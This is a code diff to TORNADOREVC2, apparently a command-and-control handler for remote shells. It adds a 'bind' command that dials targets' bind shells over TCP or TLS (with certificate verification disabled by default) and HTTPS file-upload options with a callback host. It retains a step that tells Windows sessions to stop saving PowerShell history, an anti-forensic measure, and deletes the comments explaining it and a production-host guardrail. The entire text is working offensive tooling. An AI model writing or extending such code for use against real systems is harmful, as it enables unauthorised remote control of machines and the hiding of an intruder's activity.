@@ -531,7 +531,7 @@ class TORNADOREVC2:
             if nbytes < 1024 or unit == 'GB':
                 if unit == 'B':
                     return f"{nbytes} B"
-                return f"{nbytes / 1024:.1f} {unit}"
+                return f"{nbytes:.1f} {unit}"
             nbytes /= 1024
 
     def _print_progress(self, transferred, total, start_time, label='Transfer'):
@@ -842,11 +842,22 @@ class TORNADOREVC2:
         except Exception:
             return None
 
-    def upload_file(self, client_sock, local_path, remote_path, resume=False):
-        return self.transfer.upload_file(client_sock, local_path, remote_path, resume=resume)
+    def upload_file(self, client_sock, local_path, remote_path, resume=False,
+                    use_https=False, https_bind=None, rh_host=None, rh_port=None):
+        return self.transfer.upload_file(
+            client_sock, local_path, remote_path,
+            resume=resume,
+            use_https=use_https,
+            https_bind=https_bind,
+            rh_host=rh_host,
+            rh_port=rh_port,
+        )
 
     def download_file(self, client_sock, remote_path, local_path, resume=False):
-        return self.transfer.download_file(client_sock, remote_path, local_path, resume=resume)
+        return self.transfer.download_file(
+            client_sock, remote_path, local_path,
+            resume=resume,
+        )
 
     def verify_file(self, client_sock, remote_path):
         return self.transfer.verify_file(client_sock, remote_path)
@@ -960,6 +971,9 @@ class TORNADOREVC2:
                         proto = "TLS"
                     else:
                         proto = "TCP"
+
+                    direction = "BIND" if info.get('direction') == 'bind' else "REV"
+                    proto = f"{proto}/{direction}"
 
                     display = f"#{info['id']} ({info['name']})" if info.get("name") else f"#{info['id']}"
                     sysinfo = info.get('sysinfo') or {}
@@ -1094,14 +1108,52 @@ class TORNADOREVC2:
         return f"{display}@{info['addr'][0]}:{info['addr'][1]}"
 
     def _parse_transfer_args(self, cmd_parts):
-        resume = False
-        args = []
-        for part in cmd_parts[1:]:
+        opts = {
+            'resume': False,
+            'https': False,
+            'https_bind': None,
+            'rh_host': None,
+            'rh_port': None,
+            'args': [],
+        }
+        i = 1
+        while i < len(cmd_parts):
+            part = cmd_parts[i]
+
             if part in ('--resume', '-r'):
-                resume = True
+                opts['resume'] = True
+
+            elif part in ('--https', '--http'):
+                opts['https'] = True
+                if i + 1 < len(cmd_parts):
+                    nxt = cmd_parts[i + 1]
+                    if (re.match(r'^[A-Za-z][A-Za-z0-9_-]*$', nxt)
+                            and len(nxt) < 20):
+                        opts['https_bind'] = nxt
+                        i += 1
+
+            elif part in ('-RH', '--rh', '--callback'):
+                if i + 1 >= len(cmd_parts):
+                    i += 1
+                    continue
+                spec = cmd_parts[i + 1]
+                i += 1
+                if ':' in spec:
+                    host, _, port_s = spec.rpartition(':')
+                    try:
+                        opts['rh_host'] = host or None
+                        opts['rh_port'] = int(port_s)
+                    except ValueError:
+                        opts['rh_host'] = spec
+                else:
+                    opts['rh_host'] = spec
+
             else:
-                args.append(part)
-        return resume, args
+                opts['args'].append(part)
+
+            i += 1
+
+        return opts
 
     def client_shell_menu(self, client_sock):
         info = self._client_info(client_sock)
@@ -1159,19 +1211,34 @@ class TORNADOREVC2:
                             continue
 
                     if cmd_lower == 'upload':
-                        resume, args = self._parse_transfer_args(cmd_parts)
-                        if len(args) >= 2:
-                            self.upload_file(client_sock, args[0], args[1], resume=resume)
+                        t_opts = self._parse_transfer_args(cmd_parts)
+                        t_args = t_opts['args']
+                        if len(t_args) >= 2:
+                            self.upload_file(
+                                client_sock, t_args[0], t_args[1],
+                                resume=t_opts['resume'],
+                                use_https=t_opts['https'],
+                                https_bind=t_opts['https_bind'],
+                                rh_host=t_opts['rh_host'],
+                                rh_port=t_opts['rh_port'],
+                            )
                         else:
-                            print(f"{self.colors['red']}Usage: upload [--resume] <local> <remote>{self.colors['end']}")
+                            print(f"{self.colors['red']}Usage: upload "
+                                  f"[--resume] [--https [iface]] "
+                                  f"[-RH host[:port]] <local> <remote>"
+                                  f"{self.colors['end']}")
                         continue
 
                     if cmd_lower == 'download':
-                        resume, args = self._parse_transfer_args(cmd_parts)
-                        if len(args) >= 2:
-                            self.download_file(client_sock, args[0], args[1], resume=resume)
+                        t_opts = self._parse_transfer_args(cmd_parts)
+                        t_args = t_opts['args']
+                        if len(t_args) >= 2:
+                            self.download_file(client_sock, t_args[0], t_args[1],
+                                               resume=t_opts['resume'])
                         else:
-                            print(f"{self.colors['red']}Usage: download [--resume] <remote> <local>{self.colors['end']}")
+                            print(f"{self.colors['red']}Usage: download "
+                                  f"[--resume] <remote> <local>"
+                                  f"{self.colors['end']}")
                         continue
 
                     if cmd_lower in ('verify', 'hash') and len(cmd_parts) >= 2:
@@ -1212,9 +1279,10 @@ class TORNADOREVC2:
     run <plugin> [args...]                            Execute a plugin on this session
 
     {self.colors['green']}FILE TRANSFER:{self.colors['end']}
-    upload [--resume] <local> <remote>     Chunked upload with SHA256 verify
-    download [--resume] <remote> <local>   Chunked download with SHA256 verify
-    verify/hash <remote>                   Remote file size and SHA256""")
+    upload [--resume] <local> <remote>                Chunked upload with SHA256 verify
+    upload --https [iface] [-RH host[:port]] <local> <remote>  HTTPS upload
+    download [--resume] <remote> <local>              Chunked download with SHA256 verify
+    verify/hash <remote>                              Remote file size and SHA256""")
                         continue
 
                     if info.get('guardrail_block'):
@@ -1257,7 +1325,20 @@ class TORNADOREVC2:
                 cmd_parts = cmd.strip().split()
                 cmd_lower = cmd_parts[0].lower()
 
-                if cmd_lower == 'payloads':
+                if cmd_lower == 'bind':
+                    if len(cmd_parts) < 3:
+                        print(f"{self.colors['red']}Usage: bind <host> <port> "
+                              f"[--tls] [--verify]{self.colors['end']}")
+                        continue
+                    bind_host = cmd_parts[1]
+                    bind_port = cmd_parts[2]
+                    use_tls = '--tls' in cmd_parts
+                    verify = '--verify' in cmd_parts
+                    if use_tls:
+                        self._bind_tls_client(bind_host, bind_port, verify=verify)
+                    else:
+                        self._bind_client(bind_host, bind_port)
+                elif cmd_lower == 'payloads':
                     self.print_payloads()
                 elif cmd_lower in ('status', 'ls'):
                     self.print_status()
@@ -1343,29 +1424,46 @@ class TORNADOREVC2:
                 elif self.tunnels.handle_main_command(cmd_parts):
                     pass
                 elif cmd_lower == 'upload':
-                    resume, args = self._parse_transfer_args(cmd_parts)
-                    if len(args) < 3:
-                        print(f"{self.colors['red']}Usage: upload [--resume] <ID> <local> <remote>{self.colors['end']}")
+                    t_opts = self._parse_transfer_args(cmd_parts)
+                    t_args = t_opts['args']
+                    if len(t_args) < 3:
+                        print(f"{self.colors['red']}Usage: upload "
+                              f"[--resume] [--https [iface]] "
+                              f"[-RH host[:port]] <ID> <local> <remote>"
+                              f"{self.colors['end']}")
                         continue
                     try:
-                        client_sock = self._get_client_by_id(int(args[0]))
+                        client_sock = self._get_client_by_id(int(t_args[0]))
                         if not client_sock:
-                            print(f"{self.colors['red']}Client #{args[0]} not active{self.colors['end']}")
+                            print(f"{self.colors['red']}Client #{t_args[0]} "
+                                  f"not active{self.colors['end']}")
                             continue
-                        self.upload_file(client_sock, args[1], args[2], resume=resume)
+                        self.upload_file(
+                            client_sock, t_args[1], t_args[2],
+                            resume=t_opts['resume'],
+                            use_https=t_opts['https'],
+                            https_bind=t_opts['https_bind'],
+                            rh_host=t_opts['rh_host'],
+                            rh_port=t_opts['rh_port'],
+                        )
                     except ValueError:
                         print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                 elif cmd_lower == 'download':
-                    resume, args = self._parse_transfer_args(cmd_parts)
-                    if len(args) < 3:
-                        print(f"{self.colors['red']}Usage: download [--resume] <ID> <remote> <local>{self.colors['end']}")
+                    t_opts = self._parse_transfer_args(cmd_parts)
+                    t_args = t_opts['args']
+                    if len(t_args) < 3:
+                        print(f"{self.colors['red']}Usage: download "
+                              f"[--resume] <ID> <remote> <local>"
+                              f"{self.colors['end']}")
                         continue
                     try:
-                        client_sock = self._get_client_by_id(int(args[0]))
+                        client_sock = self._get_client_by_id(int(t_args[0]))
                         if not client_sock:
-                            print(f"{self.colors['red']}Client #{args[0]} not active{self.colors['end']}")
+                            print(f"{self.colors['red']}Client #{t_args[0]} "
+                                  f"not active{self.colors['end']}")
                             continue
-                        self.download_file(client_sock, args[1], args[2], resume=resume)
+                        self.download_file(client_sock, t_args[1], t_args[2],
+                                           resume=t_opts['resume'])
                     except ValueError:
                         print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                 elif cmd_lower in ('verify', 'hash'):
@@ -1383,6 +1481,8 @@ class TORNADOREVC2:
                 elif cmd_lower == 'help':
                     print(f"""
     {self.colors['green']}SESSION MANAGEMENT:{self.colors['end']}
+    bind <host> <port> [--tls] [--verify]
+                            Dial a target listening for a bind shell
     switch <ID>             Client interaction
     kill <ID>               Terminate client
     status/ls               Show active clients
@@ -1416,9 +1516,10 @@ class TORNADOREVC2:
       filetype: py, ps, exe, elf, bat, sh
 
     {self.colors['green']}FILE TRANSFER:{self.colors['end']}
-    upload [--resume] <ID> <local> <remote>     Chunked upload with SHA256 verify
-    download [--resume] <ID> <remote> <local>   Chunked download with SHA256 verify
-    verify/hash <ID> <remote>                   Remote file size and SHA256
+    upload [--resume] <ID> <local> <remote>                     Chunked upload with SHA256 verify
+    upload --https [iface] [-RH host[:port]] <ID> <local> <remote>  HTTPS upload
+    download [--resume] <ID> <remote> <local>                   Chunked download with SHA256 verify
+    verify/hash <ID> <remote>                                   Remote file size and SHA256
 
     {self.colors['yellow']}Inside a client shell, omit <ID> for session-targeted commands{self.colors['end']}""")
             except KeyboardInterrupt:
@@ -1478,10 +1579,11 @@ class TORNADOREVC2:
         sys.stdout.flush()
         sys.stderr.flush()
 
-    def handle_client(self, client_sock, addr):
+    def handle_client(self, client_sock, addr, direction='reverse'):
         client_info = {
             'sock': client_sock,
             'addr': addr,
+            'direction': direction,
             'type': 'unknown',
             'id': None,
             'name': None,
@@ -1520,9 +1622,6 @@ class TORNADOREVC2:
             self.send_to_revshell(client_sock, term.unix_pty_upgrade_cmd())
             client_info['pty'] = True
         elif inferred == 'windows':
-            # OPSEC: disable PSReadLine history persistence so nothing the
-            # operator types is written to ConsoleHost_history.txt under
-            # %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\.
             self.send_to_revshell(
                 client_sock,
                 "Set-PSReadlineOption -HistorySaveStyle SaveNothing "
@@ -1583,7 +1682,6 @@ class TORNADOREVC2:
 
         self.registry.register_active(client_info, fingerprint, probe_output)
 
-        # Guardrails: refuse to operate on production-looking hosts.
         from .guardrails import check_host_guardrails
         ok, reason = check_host_guardrails(client_info.get('sysinfo') or {})
         if not ok:
@@ -1614,20 +1712,112 @@ class TORNADOREVC2:
         if client_info.get('logger'):
             print(f"{self.colors['blue']}Logs: {client_info['logger'].session_dir}{self.colors['end']}")
 
+    def _bind_client(self, host, port, timeout=10.0):
+        try:
+            port = int(port)
+        except (TypeError, ValueError):
+            print(f"{self.colors['red']}Invalid port: {port}{self.colors['end']}")
+            return False
+        if not (1 <= port <= 65535):
+            print(f"{self.colors['red']}Port out of range: {port}{self.colors['end']}")
+            return False
+
+        print(f"{self.colors['yellow']}Dialing bind shell at {host}:{port}...{self.colors['end']}")
+
+        try:
+            sock = socket.create_connection((host, port), timeout=timeout)
+        except socket.timeout:
+            print(f"{self.colors['red']}Connection to {host}:{port} timed out{self.colors['end']}")
+            return False
+        except OSError as exc:
+            print(f"{self.colors['red']}Connection failed: {exc}{self.colors['end']}")
+            return False
+
+        try:
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        except OSError:
+            pass
+
+        peer = sock.getpeername()[:2]
+        print(f"{self.colors['green']}Bind connection established to {peer[0]}:{peer[1]}"
+              f"{self.colors['end']}")
+
+        threading.Thread(
+            target=self.handle_client,
+            args=(sock, peer, 'bind'),
+            daemon=True,
+        ).start()
+        return True
+
+    def _bind_tls_client(self, host, port, timeout=10.0, verify=False):
+        try:
+            port = int(port)
+        except (TypeError, ValueError):
+            print(f"{self.colors['red']}Invalid port: {port}{self.colors['end']}")
+            return False
+        if not (1 <= port <= 65535):
+            print(f"{self.colors['red']}Port out of range: {port}{self.colors['end']}")
+            return False
+
+        ctx = ssl.create_default_context()
+        if not verify:
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
+
+        print(f"{self.colors['yellow']}Dialing TLS bind shell at {host}:{port}..."
+              f"{self.colors['end']}")
+        raw = None
+        try:
+            raw = socket.create_connection((host, port), timeout=timeout)
+            sock = ctx.wrap_socket(raw, server_hostname=host if verify else None)
+        except ssl.SSLError as exc:
+            print(f"{self.colors['red']}TLS handshake failed: {exc}{self.colors['end']}")
+            if raw is not None:
+                try:
+                    raw.close()
+                except OSError:
+                    pass
+            return False
+        except (socket.timeout, OSError) as exc:
+            print(f"{self.colors['red']}Connection failed: {exc}{self.colors['end']}")
+            if raw is not None:
+                try:
+                    raw.close()
+                except OSError:
+                    pass
+            return False
+
+        try:
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        except OSError:
+            pass
+
+        peer = sock.getpeername()[:2]
+        print(f"{self.colors['green']}TLS bind connection established to {peer[0]}:{peer[1]}"
+              f"{self.colors['end']}")
+
+        threading.Thread(
+            target=self.handle_client,
+            args=(sock, peer, 'bind'),
+            daemon=True,
+        ).start()
+        return True
+
     def start(self):
         self.print_banner()
         if self.host == '0.0.0.0':
             print(
                 f"{self.colors['yellow']}{self.colors['bold']}WARNING:{self.colors['end']} "
                 f"{self.colors['yellow']}The handler is currently bound to 0.0.0.0. "
-                f"This configuration may cause issues only when operating with Windows sessions "
-                f"and using HTTP-based file-upload functionality, such as the upload feature, "
-                f"ligolo, or other plugins that require the operator to host a file over HTTP "
-                f"for retrieval by the Windows session. "
-                f"File downloads from Windows targets are not affected, and any Linux-related "
-                f"functionality is not affected by this configuration. "
-                f"If possible, use a specific, reachable handler IP address for Windows "
-                f"HTTP-based file-upload functionality.{self.colors['end']}\n"
+                f"HTTPS file uploads will auto-detect the interface IP from the "
+                f"reverse shell's local endpoint, which may not be the address "
+                f"the target can actually reach. If HTTPS uploads fail or hang, "
+                f"start the handler on a specific reachable IP instead, or pass "
+                f"-RH <reachable-ip>:<port> when using --https."
+                f"{self.colors['end']}\n"
             )
         self.ensure_tls_certificates()
         self.ensure_mtls_certificates()
